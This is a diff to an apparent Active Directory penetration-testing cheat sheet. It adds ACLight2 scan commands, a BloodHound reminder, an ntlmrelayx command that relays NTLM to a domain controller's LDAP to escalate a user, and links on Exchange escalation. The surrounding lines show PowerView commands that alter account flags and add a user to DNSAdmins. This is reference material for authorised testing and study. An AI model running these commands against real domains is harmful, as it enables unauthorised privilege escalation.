@@ -181,6 +181,21 @@ Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbos
 ```
 Find-InterestingDomainAcl -ResolveGUIDS -Domain <DOMAIN>
 ```
+- Check every owned user in bloodhoud
+
+#### Aclight2 scan
+- https://github.com/cyberark/ACLight
+```
+Import-Module ACLight2.psm1
+Start-ACLAnalysis
+```
+
+#### NTLMRelay
+- It is possible to abuse ACL with NTLMRelay abuse
+- Also possible to abuse Exchange Server: https://pentestlab.blog/2019/09/04/microsoft-exchange-domain-escalation/
+```
+ntlmrelayx.py -t ldap://<DC IP> --escalate-user <USER>
+```
 
 #### Set SPN
 - See [Set SPN](#Set-SPN) 
@@ -255,6 +270,9 @@ $user = Get-DomainUser -Identity <USER>
 $group = Get-DomainGroup -Identity 'DNSAdmins' -Domain <DOMAIN>
 Add-DomainGroupMember -Identity $group -Members $user -Verbose
 ```
+
+### NTLM Relay MS Exchange abuse
+- https://pentestlab.blog/2019/09/04/microsoft-exchange-domain-escalation/
 
 ## Delegation
 ### Unconstrained Delegation
